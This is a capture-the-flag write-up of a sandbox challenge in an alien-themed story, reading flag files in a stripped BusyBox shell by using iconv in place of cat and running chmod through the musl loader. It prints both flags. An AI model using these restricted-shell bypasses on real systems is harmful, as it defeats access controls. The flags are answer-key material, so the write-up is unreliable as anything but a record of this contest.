Your Choice!


    Having found the information you were looking for, while detailed, 
    it presents you with an interesting dilemma. There is a network of 
    "computers" not completely dissimilar to your computrator-machine 
    on your ship. You find yourself in possession of the credentials of 
    an individual on the planet named "SarahH." Great, with these you 
    can get right into the secret world of an earthling without them 
    knowing you're there. You access "SarahH home network," to find two 
    computers: "work" and "home." Not knowing what either of these are, 
    you have to make a decision.


No decisions, no compromises - we will hack both. Or else why we are 
sitting with laptop at home in such a great summer weekend?

Work Computer (ORME) (**sandbox**)

    With the confidence of conviction and decision making skills that 
    made you a contender for Xenon's Universal takeover council, now 
    disbanded, you forge ahead to the work computer. This machine 
    announces itself to you, surprisingly with a detailed description 
    of all its hardware and peripherals. Your first thought is "Why 
    does the display stand need to announce its price? And exactly how 
    much does 999 dollars convert to in Xenonivian Bucklets?" You 
    always were one for the trivialities of things. Also presented is 
    an image of a fascinating round and bumpy creature, labeled 
    "Cauliflower for cWo" - are "Cauliflowers" earthlings? Your 40 
    hearts skip a beat - these are not the strange unrelatable bipeds 
    you imagined earthings to be.. this looks like your neighbors back 
    home. Such curdley lobes. Will it be at the party? SarahH, who 
    appears to be a programmer with several clients, has left open a 
    terminal. Oops. Sorry clients! Aliens will be poking around 
    attempting to access your networks.. looking for Cauliflower. That 
    is, *if* they can learn to navigate such things.

There is some network address, let's try to connect to it.

    $ nc readme.ctfcompetition.com 1337
    > whoami
    whoami: unknown uid 1338
    > ls -l
    total 8
    ----------    1 1338     1338            33 Jun 25 19:21 ORME.flag
    -r--------    1 1338     1338            28 Jun 25 19:21 README.flag
    > cat README.flag
    error: No such file or directory

Well, we have a shell, we have two files that must be read, but we 
have not `cat` (and `grep`). We plan to read both, of course.
Let's have a look what we have then.

    > ls -l /bin /sbin /usr/bin /usr/sbin                                         
    /bin:
    total 800
    lrwxrwxrwx    1 65534    65534           12 May  9 20:49 arch -> /bin/busybox
    -rwxr-xr-x    1 65534    65534       796240 Jan 24 07:45 busybox
    lrwxrwxrwx    1 65534    65534           12 May  9 20:49 chgrp -> /bin/busybox
    lrwxrwxrwx    1 65534    65534           12 May  9 20:49 chown -> /bin/busybox
    lrwxrwxrwx    1 65534    65534           12 May  9 20:49 conspy -> /bin/busybox
    ..............
    /sbin:
    total 228
    lrwxrwxrwx    1 65534    65534           12 May  9 20:49 acpid -> /bin/busybox
    lrwxrwxrwx    1 65534    65534           12 May  9 20:49 adjtimex -> /bin/busybox
    ..............
    /usr/bin:
    total 1984
    lrwxrwxrwx    1 65534    65534           12 May  9 20:49 [ -> /bin/busybox
    lrwxrwxrwx    1 65534    65534           12 May  9 20:49 [[ -> /bin/busybox
    ..............
    -rwxr-xr-x    1 65534    65534        25216 Mar 19 09:56 iconv
    ..............
    -rwxr-xr-x    1 65534    65534        83744 Nov 15  2018 scanelf
    ..............
    /usr/sbin:
    total 16
    lrwxrwxrwx    1 65534    65534           12 May  9 20:49 addgroup -> /bin/busybox
    lrwxrwxrwx    1 65534    65534           12 May  9 20:49 adduser -> /bin/busybox
    ..............
    > 

Wow, a lot of stuff! First of all, this is Busybox system. It means 
that most of utilities are embedded in `busybox` executable and almost 
all other are just symlinks to it. Busybox first checks `argv[0]` value 
and executed appropriate piece of code. But also certain utility can be 
invoked by executing `busybox` directly and giving it proper arguments.
Try it:

    > busybox cat README.flag
    busybox can not be called for alien reasons.

Aha, this is modified version of busybox. After all, it would be too 
easy.
But still there are A LOT of stuff. And a lot of possible solutions. 
If we have little or no expirience with unix-like environments, then we 
can just go through the list command-by-command and read each man-page 
on the web. Quickly we can find, for example, that `iconv` utility can 
be used to read any file and print it to the terminal possibly but not 
necessary doing codepage conversion. Give it a try:

    > iconv README.flag
    CTF{4ll_D474_5h4ll_B3_Fr33}
    > iconv ORME.flag
    iconv: ORME.flag: Permission denied

First flag is ours:

**CTF{4ll_D474_5h4ll_B3_Fr33}**

For the second one we need to find a way to change it's permission 
flags. Fortunately we are the owner of this file and are capable to 
change it's permissions. Unfortunately, `chmod` utility is abscent.
It is obvious, that `chmod` symlink is removed, but code of it is still 
contained in `busybox`. And maybe in some other places. Check it:

    > scanelf -s chmod -R /
     TYPE   SYM FILE 
    ET_DYN chmod /lib/libcrypto.so.1.1 
    ET_DYN chmod /lib/ld-musl-x86_64.so.1 
    ET_DYN chmod /usr/bin/upx 
    ET_DYN chmod /bin/busybox 

Yep, it is there. And `upx` utility looks very suspicious and certainly 
can be used to solve issue. But let's do some googling first, it is 
their contest after all!
Googling "*change permissions without chmod*" immidiately leads us to 
the StackOverflow page with description of trick with loader 
`/lib/ld-linux.so`. Just use it to run `busybox` and `chmod` in it:

    > ls /lib
    apk
    firmware
    ld-musl-x86_64.so.1
    libc.musl-x86_64.so.1
    libcrypto.so.1.1
    libssl.so.1.1
    libz.so.1
    libz.so.1.2.11
    mdev
    > /lib/ld-musl-x86_64.so.1 /bin/busybox chmod +r ORME.flag
    > ls -l
    total 8
    -r--r--r--    1 1338     1338            33 Jun 25 19:51 ORME.flag
    -r--------    1 1338     1338            28 Jun 25 19:51 README.flag
    > iconv ORME.flag
    CTF{Th3r3_1s_4lw4y5_4N07h3r_W4y}

**CTF{Th3r3_1s_4lw4y5_4N07h3r_W4y}**
